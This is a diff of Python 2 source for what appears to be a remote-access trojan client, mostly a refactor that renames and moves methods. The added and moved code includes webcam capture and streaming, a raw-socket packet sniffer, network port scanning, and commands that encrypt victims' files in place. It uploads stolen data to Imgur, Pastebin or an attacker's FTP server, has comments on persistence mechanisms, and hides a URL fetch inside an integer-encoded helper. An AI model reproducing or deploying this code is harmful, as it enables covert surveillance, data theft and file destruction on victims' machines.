@@ -116,7 +116,7 @@ class Client():
         - dynamically generates deliverables as executables native to the host environment
         - no downloads, no installations, no configuration, no dependencies
 
-    >  unbreakable modern encryption implemented in all communication
+    >  end-to-end encryption implemented in all communication
         - AES cipher in CBC mode - secure confidentiality
         - HMAC-SHA256 hash authentication - secure integrity and authenticity
         - 256 bit keys generated each session via Diffie-Hellman transactionless key-agreement method
@@ -145,29 +145,34 @@ class Client():
         self._commands  = {cmd: {'method': getattr(self, cmd), 'usage': getattr(Client, cmd).usage, 'description': getattr(Client, cmd).func_doc.strip().rstrip(), 'platforms': getattr(Client, cmd).platforms} for cmd in vars(Client) if hasattr(getattr(Client, cmd), 'command')}
 
 
-    # private static methods
+    # Private Methods
 
 
     @staticmethod
     def _debug(data):
         print(data) if Client.debug else None
 
+
     @staticmethod
     def _xor(s, t):
         return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))
+
 
     @staticmethod
     def _pad(s, block_size):
         return bytes(s) + (block_size - len(bytes(s)) % block_size) * '\x00'
 
+
     @staticmethod
     def _block(s, block_size):
         return [s[i * block_size:((i + 1) * block_size)] for i in range(len(s) // block_size)]
+
 
     @staticmethod
     def _long_to_bytes(x, default=False, **kwargs):
         return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L'))) if default else urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))).read()
   
+
     @staticmethod
     def _is_ipv4_address(address):
         try:
@@ -182,6 +187,7 @@ class Client():
             for k,v in kwargs.items():
                 setattr(getattr(Client, target), k, v)
 
+
     @staticmethod
     def _post(url, headers={}, data={}):
         dat = urllib.urlencode(data)
@@ -189,6 +195,7 @@ class Client():
         for key, value in headers.items():
             req.add_header(key, value)
         return urllib2.urlopen(req).read()
+
 
     @staticmethod
     def _get_primes(n):
@@ -200,9 +207,11 @@ class Client():
                 sieve[k*(k-2*(i&1)+4)/3::2*k] = False
         return numpy.r_[2,3,((3*numpy.nonzero(sieve)[0][1:]+1)|1)]
 
+
     @staticmethod
     def _get_nth_prime(p):
         return (Client._get_primes(i)[-1] for i in xrange(int(p*1.5), int(p*15)) if len(Client._get_primes(i)) == p).next()     
+
 
     @staticmethod
     def _get_host():
@@ -211,6 +220,7 @@ class Client():
         except Exception as e:
             Client._debug(str(e))
 
+
     @staticmethod                
     def _get_info():
         try:
@@ -218,12 +228,14 @@ class Client():
         except Exception as e:
             Client._debug(str(e))
 
+
     @staticmethod
     def _get_services():
         try:
             return {i.split()[1][:-4]: [i.split()[0], ' '.join(i.split()[2:])] for i in open('C:\Windows\System32\drivers\etc\services' if os.name == 'nt' else '/etc/services').readlines() if len(i.split()) > 1 if 'tcp' in i.split()[1]}
         except Exception as e:
             Client._debug(str(e))
+
 
     @staticmethod            
     def _get_status(c):
@@ -236,10 +248,12 @@ class Client():
         except Exception as e:
             Client._debug(str(e))
 
+
     @staticmethod
     def _get_usage(function):
         if hasattr(function, 'usage'):
             return "usage: %s" % getattr(function, 'usage')
+
 
     @staticmethod
     def _get_process_list(executables=False):
@@ -256,6 +270,7 @@ class Client():
                 try:
                     yield "{:>6}\t{:>20}\t{:>10}\t{:>30}".format(str(p.pid), str(p.name())[:19], str(p.status()), str(p.exe())[:29])
                 except: pass
+
 
     @classmethod
     def _get_port(self, addr):
@@ -276,6 +291,7 @@ class Client():
             pass
         except Exception as e:
             self._debug('{} error: {}'.format(self._get_port.func_name.title(), str(e)))
+
 
     @classmethod
     def _get_event(event):
@@ -309,6 +325,7 @@ class Client():
         except Exception as e:
             self._debug('{} error: {}'.format(self._get_event.title(), str(e)))
         return True
+
 
     @staticmethod
     def _get_png(image):
@@ -344,45 +361,81 @@ class Client():
            Client._debug(str(e))
 
 
-    # Obfuscation: stores/retrieves data values at prime indexes within block of random data
-    
-
     @staticmethod
     def obfuscate(data):
-        """
-        obfuscation method for non-priority data
-        """
         data = bytearray(i for i in reversed(data))
         z    = Client._get_nth_prime(len(data) + 1)
         return base64.b64encode(''.join([(chr(data.pop()) if i in Client._get_primes(z) else os.urandom(1)) for i in xrange(z)]))
 
+
     @staticmethod
     def deobfuscate(block):
-        """
-        deobfuscation method for any data obfuscated by client
-        """
         return bytes().join(chr(bytearray(base64.b64decode(block))[_]) for _ in Client._get_primes(len(bytearray(base64.b64decode(block)))))
-    
 
-    # XOR Encryption / Decryption
+    
+    @staticmethod
+    @config(platforms=['win32','linux2','darwin'], api_key=None)
+    def _upload_imgur(source):
+        if hasattr(source, 'getvalue'):
+            data = source.getvalue()
+        elif hasattr(source, 'read'):
+            if hasattr(source, 'seek'):
+                source.seek(0)
+            data = source.read()
+        else:
+            data = bytes(source)
+        return json.loads(Client._post('https://api.imgur.com/3/upload', headers={'Authorization': Client._upload_imgur.api_key}, data={'image': base64.b64encode(data), 'type': 'base64'})).get('data').get('link')
+
+
+    @staticmethod
+    @config(platforms=['win32','linux2','darwin'], api_dev_key=None, api_user_key=None)
+    def _upload_pastebin(source):
+        if hasattr(source, 'getvalue'):
+            text = source.getvalue()
+        elif hasattr(source, 'read'):
+            if hasattr(source, 'seek'):
+                source.seek(0)
+            text = source.read()
+        else:
+            text = bytes(source)
+        try:
+            info = {'api_option': 'paste', 'api_paste_code': text}
+            info.update({'api_user_key': Client._upload_pastebin.api_user_key}) if hasattr(Client._upload_pastebin, 'api_user_key') else None
+            info.update({'api_dev_key' : Client._upload_pastebin.api_dev_key}) if hasattr(Client._upload_pastebin, 'api_dev_key') else None
+            paste = Client._post('https://pastebin.com/api/api_post.php', data=info)
+            return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
+        except Exception as e:
+            Client._debug('{} error: {}'.format(Client._upload_pastebin.func_name.title(), str(e)))
+
+
+    @staticmethod
+    @config(platforms=['win32','linux2','darwin'], hostname=None, username=None, password=None)
+    def _upload_ftp(source):
+        addr    = urllib.urlopen('http://api.ipify.org').read()
+        host    = ftplib.FTP(Client._upload_ftp.hostname, Client._upload_ftp.username, Client._upload_ftp.password)
+        if addr not in host.nlst('/htdocs'):
+            host.mkd('/htdocs/{}'.format(addr))
+        local   = time.ctime().split()
+        ext     = os.path.splitext(source)[1] if os.path.isfile(str(source)) else '.txt'
+        result  = '/htdocs/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], ext))
+        source  = open(source, 'rb') if os.path.isfile(str(source)) else source
+        upload  = host.storbinary('STOR ' + result, source)
+        return result
 
 
     @staticmethod
     @config(block_size=8, key_size=16, num_rounds=32)
-    def encrypt_xor(data, key):
-        """
-        pure python XOR encryption
-        """
-        data    = Client._pad(data, Client.encrypt_xor.block_size)
-        blocks  = Client._block(data, Client.encrypt_xor.block_size)
+    def _encrypt_xor(data, key):
+        data    = Client._pad(data, Client._encrypt_xor.block_size)
+        blocks  = Client._block(data, Client._encrypt_xor.block_size)
         vector  = os.urandom(8)
         result  = [vector]
         for block in blocks:
             block   = Client._xor(vector, block)
             v0, v1  = struct.unpack("!2L", block)
-            k       = struct.unpack("!4L", key[:Client.encrypt_xor.key_size])
+            k       = struct.unpack("!4L", key[:Client._encrypt_xor.key_size])
             sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
-            for round in range(Client.encrypt_xor.num_rounds):
+            for round in range(Client._encrypt_xor.num_rounds):
                 v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
                 sum = (sum + delta) & mask
                 v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
@@ -393,20 +446,17 @@ class Client():
 
     @staticmethod
     @config(block_size=8, key_size=16, num_rounds=32)
-    def decrypt_xor(data, key):
-        """
-        pure python XOR decryption
-        """
+    def _decrypt_xor(data, key):
         data    = base64.b64decode(data)
-        blocks  = Client._block(data, Client.decrypt_xor.block_size)
+        blocks  = Client._block(data, Client._decrypt_xor.block_size)
         vector  = blocks[0]
         result  = []
         for block in blocks[1:]:
             v0, v1 = struct.unpack("!2L", block)
-            k = struct.unpack("!4L", key[:Client.decrypt_xor.key_size])
+            k = struct.unpack("!4L", key[:Client._decrypt_xor.key_size])
             delta, mask = 0x9e3779b9L, 0xffffffffL
-            sum = (delta * Client.decrypt_xor.num_rounds) & mask
-            for round in range(Client.decrypt_xor.num_rounds):
+            sum = (delta * Client._decrypt_xor.num_rounds) & mask
+            for round in range(Client._decrypt_xor.num_rounds):
                 v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
                 sum = (sum - delta) & mask
                 v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
@@ -417,14 +467,8 @@ class Client():
         return ''.join(result).rstrip('\x00')
 
 
-    # AES-CBC + HMAC-SHA256 Encryption / Decryption
-
-
     @staticmethod
-    def encrypt_aes(plaintext, key):
-        """
-        AES encryption with 256-bit key in CBC mode and HMAC-SHA256 hash authentication
-        """
+    def _encrypt_aes(plaintext, key):
         text        = Client._pad(plaintext, AES.block_size)
         iv          = os.urandom(AES.block_size)
         cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
@@ -435,10 +479,7 @@ class Client():
 
 
     @staticmethod
-    def decrypt_aes(ciphertext, key):
-        """
-        AES decryption with 256-bit key in CBC mode and HMAC-SHA256 hash authentication
-        """
+    def _decrypt_aes(ciphertext, key):
         ciphertext  = base64.b64decode(ciphertext)
         iv          = ciphertext[:AES.block_size]
         cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
@@ -450,208 +491,6 @@ class Client():
         except ValueError:
             Client._debug('HMAC-SHA256 hash authentication check failed - transmission may have been compromised')
         return output
-
-
-    @staticmethod
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='encrypt_file <file>')
-    def encrypt_file(filepath):
-        """
-        encrypt target file using currently configured encryption method
-        """
-        if os.path.isfile(filepath):
-            try:
-                with open(filepath, 'rb') as fp:
-                    plaintext = fp.read()
-                ciphertext = Client.encrypt(plaintext)
-                if Client.debug:
-                    target = os.path.join(os.path.dirname(filepath), 'encrypted_%s' % os.path.basename(filepath))
-                    with open(target, 'wb') as fd:
-                        fd.write(ciphertext)
-                else:
-                    with open(filepath, 'wb') as fd:
-                        fd.write(ciphertext)
-                return filepath
-            except Exception as e:
-                return str(e)
-        else:
-            return "File '{}' not found".format(filepath)
-        
-
-    @staticmethod
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='decrypt_file <file>')
-    def decrypt_file(filepath):
-        """
-        decrypt target file using currently configured encryption method
-        """
-        if os.path.isfile(filepath):
-            try:
-                with open(filepath, 'rb') as fp:
-                    ciphertext = fp.read()
-                plaintext = Client.decrypt(ciphertext)
-                with open(filepath, 'wb') as fd:
-                    fd.write(plaintext)
-                return filepath
-            except Exception as e:
-                return str(e)
-        else:
-            return "File '{}' not found".format(filepath)
-
-
-    @staticmethod
-    @config(platforms=['win32','linux2','darwin'])
-    def encrypt(data):
-        """
-        encrypt plaintext with 256-bit AES-CBC + HMAC-SHA256 authentication (fall back to classic XOR encryption when PyCrypto is not available)
-        """
-        return Client.encrypt_aes(data, Client.deobfuscate(Client._session['key'])) if 'AES' in Client.encrypt.mode else Client.encrypt_xor(data, Client.deobfuscate(Client._session['key']))
-
-
-    @staticmethod
-    @config(platforms=['win32','linux2','darwin'])
-    def decrypt(data):
-        """
-        decrypt ciphertext with 256-bit AES-CBC + HMAC-SHA256 authentication (fall back to classic XOR encryption when PyCrypto is not available)
-        """
-        return Client.decrypt_aes(data, Client.deobfuscate(Client._session['key'])) if 'AES' in Client.encrypt.mode else Client.decrypt_xor(data, Client.deobfuscate(Client._session['key']))
-
-
-    # Upload methods: Imgur, Pastebin, FTP
-    
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <file>\nmodes: imgur, pastebin, ftp')
-    def upload(self, args):
-        """
-        upload file/data to imgur, pastebin, or ftp
-        """
-        try:
-            mode, _, source = str(args).partition(' ')
-            target  = 'upload_{}'.format(mode)
-            if not source or not hasattr(self, target):
-                return 'usage: upload <mode> <file>\nmode: ftp, pastebin, imgur\nfile: name of target file'
-            try:
-                return getattr(self, target)(source)
-            except Exception as e:
-                return 'Upload error: {}'.format(str(e))
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.upload.func_name, str(e))
-
-
-    # Port Scanner
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='scan <mode> <target>')
-    def scan(self, arg):
-        """
-        port scanner - modes: host, ports, network
-        """
-        try:
-            if len(arg.split()) == 1:
-                host     = self._get_host()['private']
-                if arg   == 'network':
-                    mode = 'network'
-                elif arg == 'host':
-                    mode = 'host'
-                elif arg == 'ports':
-                    mode = 'ports'
-                else:
-                    return "usage: scan <mode> <ip>\nmode: network, host, ports"
-            else:
-                mode, _, host = arg.partition(' ')
-                if mode not in ('host', 'ports', 'network'):
-                    return "usage: scan <mode> <ip>\nmode: network, host, ports"
-                if not self._is_ipv4_address(host):
-                    return "Invalid target IP address"
-            if mode == 'network':
-                return self._scan_network(host)
-            elif mode == 'host':
-                if self._ping(host):
-                    return "{} is online".format(host)
-            elif mode == 'ports':
-                if self._ping(host):
-                    return self._scan_host(host)
-                else:
-                    return "{} is offline".format(host)
-            else:
-                return "usage: scan <mode> <ip>\nmode: network, host, ports"
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.scan.func_name, str(e))        
-
-
-    # Webcam
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]\nmodes: image, video, stream\noptions: imgur (images), ftp (videos), port (streaming)')
-    def webcam(self, args=None):
-        """
-        capture from webcam and upload to imgur, pastebin, ftp
-        """
-        if not args:
-            return self._get_usage(self.webcam)
-        try:
-            port = None
-            args = str(args).split()
-            mode = args[0].lower() if len(args) else 'stream'
-            if 'image' in mode:
-                mode = 'image'
-            elif 'video' in mode:
-                mode = 'video'
-            elif 'stream' in mode:
-                mode = 'stream'
-                if len(args) != 2:
-                    return "Error - stream mode requires argument: 'port'"
-                port = args[1]
-            else:
-                return self._get_usage(self.webcam)
-            result   = getattr(self, '_webcam_{}'.format(mode))(port=port)
-            return result
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.webcam.func_name.strip('_').title(), str(e))
-
-
-    # PacketSniffer
-
-
-    @config(platforms=['linux2','darwin'], command=True, usage='packetsniffer <duration> [upload type]')
-    def packetsniffer(self, duration, *args):
-        """
-        capture packets and upload to pastebin or ftp
-        """
-        def sniffer(self, seconds, *args):
-            limit = time.time() + seconds
-            sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
-            while time.time() < limit:
-                try:
-                    recv_data = sniffer_socket.recv(2048)
-                    recv_data, ip_bool = self._packetsniffer_eth_header(recv_data)
-                    if ip_bool:
-                        recv_data, ip_proto = self._packetsniffer_ip_header(recv_data)
-                        if ip_proto == 6:
-                            recv_data = self._packetsniffer_tcp_header(recv_data)
-                        elif ip_proto == 17:
-                            recv_data = self._packetsniffer_udp_header(recv_data)
-                except: break
-            sniffer_socket.close()
-            try:
-                output = cStringIO.StringIO('\n'.join(self.packetsniffer.capture))
-                result = self._upload_pastebin(output) if 'ftp' not in args else self._upload_ftp(output)
-            except Exception as e:
-                self._debug("packetsniffer manager returned error: {}".format(str(e)))
-        try:
-            if self.packetsniffer.func_name in self._jobs:
-                return "packetsniffer running for {}".format(self._get_status(self._jobs[self.packetsniffer.func_name].name))
-            if not str(duration).isdigit():
-                return "packetsniffer argument 'duration' must be integer"
-            duration = int(duration)
-            self._jobs[self.packetsniffer.func_name] = threading.Thread(target=sniffer, args=(self, duration), name=time.time())
-            self._jobs[self.packetsniffer.func_name].start()
-            return 'Capturing network traffic for {} seconds'.format(duration)
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.packetsniffer.func_name.title(), str(e))
-
-
-    # Port Scan modes:
-    #   host
-    #   network
 
 
     @config(platforms=['win32','linux2','darwin']) 
@@ -696,12 +535,6 @@ class Client():
             return json.dumps(self._network)
         except Exception as e:
             self._debug('{} error: {}'.format(self.scan_network.func_name.title(), str(e)))
-
-
-    # Webcam methods:
-    #   image
-    #   video
-    #   stream
 
 
     @config(platforms=['win32','linux2','darwin'])
@@ -770,17 +603,6 @@ class Client():
                 dev.release()
                 sock.close()
             except: pass
-
-
-
-    # Persistence - add/remove methods for:
-    #   hidden file
-    #   scheduled task
-    #   registry key
-    #   startup file
-    #   launch agent
-    #   crontab job
-
 
 
     @config(platforms=['win32','linux2','darwin'])
@@ -1034,12 +856,6 @@ class Client():
         return False
 
 
-    # Packetsniffer - decoder methods for:
-    #   TCP
-    #   UDp
-    #   ETH
-    #   IP
-
 
     @config(platforms=['linux2','darwin'])
     def _packetsniffer_udp_header(self, data):
@@ -1160,10 +976,195 @@ class Client():
         except Exception as e:
             self.packetsniffer.capture.append("Error in {} header: '{}'".format('ETH', str(e)))
 
-   
 
-    # Client commands
 
+    # Public Methods
+ 
+
+
+    @staticmethod
+    @config(platforms=['win32','linux2','darwin'])
+    def encrypt(data):
+        """
+        encrypt plaintext with 256-bit AES-CBC + HMAC-SHA256 authentication (fall back to classic XOR encryption when PyCrypto is not available)
+        """
+        return Client._encrypt_aes(data, Client.deobfuscate(Client._session['key'])) if 'AES' in Client.encrypt.mode else Client._encrypt_xor(data, Client.deobfuscate(Client._session['key']))
+
+
+    @staticmethod
+    @config(platforms=['win32','linux2','darwin'])
+    def decrypt(data):
+        """
+        decrypt ciphertext with 256-bit AES-CBC + HMAC-SHA256 authentication (fall back to classic XOR encryption when PyCrypto is not available)
+        """
+        return Client._decrypt_aes(data, Client.deobfuscate(Client._session['key'])) if 'AES' in Client.encrypt.mode else Client._decrypt_xor(data, Client.deobfuscate(Client._session['key']))
+
+
+    @staticmethod
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='encrypt_file <file>')
+    def encrypt_file(filepath):
+        """
+        encrypt target file using currently configured encryption method
+        """
+        if os.path.isfile(filepath):
+            try:
+                with open(filepath, 'rb') as fp:
+                    plaintext = fp.read()
+                ciphertext = Client.encrypt(plaintext)
+                if Client.debug:
+                    target = os.path.join(os.path.dirname(filepath), 'encrypted_%s' % os.path.basename(filepath))
+                    with open(target, 'wb') as fd:
+                        fd.write(ciphertext)
+                else:
+                    with open(filepath, 'wb') as fd:
+                        fd.write(ciphertext)
+                return filepath
+            except Exception as e:
+                return str(e)
+        else:
+            return "File '{}' not found".format(filepath)
+        
+
+    @staticmethod
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='decrypt_file <file>')
+    def decrypt_file(filepath):
+        """
+        decrypt target file using currently configured encryption method
+        """
+        if os.path.isfile(filepath):
+            try:
+                with open(filepath, 'rb') as fp:
+                    ciphertext = fp.read()
+                plaintext = Client.decrypt(ciphertext)
+                with open(filepath, 'wb') as fd:
+                    fd.write(plaintext)
+                return filepath
+            except Exception as e:
+                return str(e)
+        else:
+            return "File '{}' not found".format(filepath)
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <file>\nmodes: imgur, pastebin, ftp')
+    def upload(self, args):
+        """
+        upload file/data to imgur, pastebin, or ftp
+        """
+        try:
+            mode, _, source = str(args).partition(' ')
+            target  = 'upload_{}'.format(mode)
+            if not source or not hasattr(self, target):
+                return 'usage: upload <mode> <file>\nmode: ftp, pastebin, imgur\nfile: name of target file'
+            try:
+                return getattr(self, target)(source)
+            except Exception as e:
+                return 'Upload error: {}'.format(str(e))
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.upload.func_name, str(e))
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='scan <mode> <target>')
+    def scan(self, arg):
+        """
+        port scanner - modes: host, ports, network
+        """
+        try:
+            if len(arg.split()) == 1:
+                host     = self._get_host()['private']
+                if arg   == 'network':
+                    mode = 'network'
+                elif arg == 'host':
+                    mode = 'host'
+                elif arg == 'ports':
+                    mode = 'ports'
+                else:
+                    return "usage: scan <mode> <ip>\nmode: network, host, ports"
+            else:
+                mode, _, host = arg.partition(' ')
+                if mode not in ('host', 'ports', 'network'):
+                    return "usage: scan <mode> <ip>\nmode: network, host, ports"
+                if not self._is_ipv4_address(host):
+                    return "Invalid target IP address"
+            if mode == 'network':
+                return self._scan_network(host)
+            elif mode == 'host':
+                if self._ping(host):
+                    return "{} is online".format(host)
+            elif mode == 'ports':
+                if self._ping(host):
+                    return self._scan_host(host)
+                else:
+                    return "{} is offline".format(host)
+            else:
+                return "usage: scan <mode> <ip>\nmode: network, host, ports"
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.scan.func_name, str(e))        
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]\nmodes: image, video, stream\noptions: imgur (images), ftp (videos), port (streaming)')
+    def webcam(self, args=None):
+        """
+        capture from webcam and upload to imgur, pastebin, ftp
+        """
+        if not args:
+            return self._get_usage(self.webcam)
+        try:
+            port = None
+            args = str(args).split()
+            mode = args[0].lower() if len(args) else 'stream'
+            if 'image' in mode:
+                mode = 'image'
+            elif 'video' in mode:
+                mode = 'video'
+            elif 'stream' in mode:
+                mode = 'stream'
+                if len(args) != 2:
+                    return "Error - stream mode requires argument: 'port'"
+                port = args[1]
+            else:
+                return self._get_usage(self.webcam)
+            result   = getattr(self, '_webcam_{}'.format(mode))(port=port)
+            return result
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.webcam.func_name.strip('_').title(), str(e))
+
+
+    @config(platforms=['linux2','darwin'], command=True, usage='packetsniffer <duration> [upload type]')
+    def packetsniffer(self, duration, *args):
+        """
+        capture packets and upload to pastebin or ftp
+        """
+        def sniffer(self, seconds, *args):
+            limit = time.time() + seconds
+            sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+            while time.time() < limit:
+                try:
+                    recv_data = sniffer_socket.recv(2048)
+                    recv_data, ip_bool = self._packetsniffer_eth_header(recv_data)
+                    if ip_bool:
+                        recv_data, ip_proto = self._packetsniffer_ip_header(recv_data)
+                        if ip_proto == 6:
+                            recv_data = self._packetsniffer_tcp_header(recv_data)
+                        elif ip_proto == 17:
+                            recv_data = self._packetsniffer_udp_header(recv_data)
+                except: break
+            sniffer_socket.close()
+            try:
+                output = cStringIO.StringIO('\n'.join(self.packetsniffer.capture))
+                result = self._upload_pastebin(output) if 'ftp' not in args else self._upload_ftp(output)
+            except Exception as e:
+                self._debug("packetsniffer manager returned error: {}".format(str(e)))
+        try:
+            if self.packetsniffer.func_name in self._jobs:
+                return "packetsniffer running for {}".format(self._get_status(self._jobs[self.packetsniffer.func_name].name))
+            if not str(duration).isdigit():
+                return "packetsniffer argument 'duration' must be integer"
+            duration = int(duration)
+            self._jobs[self.packetsniffer.func_name] = threading.Thread(target=sniffer, args=(self, duration), name=time.time())
+            self._jobs[self.packetsniffer.func_name].start()
+            return 'Capturing network traffic for {} seconds'.format(duration)
+        except Exception as e:
+            return "{} returned error: '{}'".format(self.packetsniffer.func_name.title(), str(e))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
